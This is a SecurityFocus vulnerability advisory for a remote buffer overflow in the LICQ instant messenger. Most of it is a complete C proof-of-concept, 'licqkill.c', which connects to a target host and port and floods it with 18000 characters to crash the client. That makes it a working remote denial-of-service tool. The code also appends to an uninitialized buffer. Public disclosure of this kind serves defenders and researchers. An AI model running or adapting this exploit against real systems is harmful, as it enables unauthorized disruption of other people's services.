source: http://www.securityfocus.com/bid/2406/info

At least one version of LICQ is vulnerable to a remote buffer overflow. By sending many characters (12000-16000) to the port on which LICQ is listening, an attacker can cause excessive data to be copied onto the stack and overwrite critical parts of the stack frame such as the calling functions' return address. Since this data is supplied by the user it can alter the program's flow of execution.

/*
 * Name: Licqkill.c
 * Author: Stan Bubrouski <stan@ccs.neu.edu>
 * Date: December 26, 2000
 * Description: Licq will crash when 16707 or more characters are sent to the port
 *              Licq is listening on.  Finding the port Licq is running on is pretty
 *              simple because by default it starts using ports around 1100 or so.  This
 *              has been tested against Licq v.85 and v1.0.2
 * Purpose: Proof-of-concept tool for the Licq Denial of Service vulnerability.
 */

#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main(int argc, char **argv)
{
	char buf[18000];
	int i, sock, result;
	struct sockaddr_in sin;
	struct hostent *hn;

	printf("licqkill.c - Licq remote DoS by Stan Bubrouski <stan@ccs.neu.edu>\n\n");

	if (argc < 3) 
	{
		fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
		exit(-1);
	}

	hn = gethostbyname(argv[1]);

	if (!hn)
	{
		fprintf(stderr, "%s: host lookup failure\n", argv[1]);
		exit(-1);
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(argv[2]));
	sin.sin_addr = *(struct in_addr *)hn->h_addr;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	result = connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

	if (result != 0) 
	{ 
		fprintf(stderr, "Failed to establish connection to %s\n", argv[1]);
		exit(-1);
	}
	
	if (sock < 0)
	{
		fprintf(stderr, "Socket error.");
		exit(-1);
	}

	for (i=0; i<18000; i++)
		strncat(buf, "A", 1);
	send(sock, buf, sizeof(buf), 0);
	close(sock);
	fprintf(stdout, "Data sent\n\n");
}